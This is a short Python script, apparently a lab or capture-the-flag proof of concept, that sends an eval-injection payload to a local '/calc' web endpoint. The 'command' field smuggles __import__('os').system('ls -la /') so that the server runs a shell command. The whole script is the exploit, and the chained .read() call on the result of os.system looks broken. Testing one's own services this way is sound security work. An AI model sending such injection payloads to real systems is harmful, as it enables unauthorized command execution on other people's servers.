import requests

url = 'http://127.0.0.1:5000/calc'

payload = "__import__('os').system('ls -la /').read()"

response = requests.post(url, data={'command': payload})

print(response.json())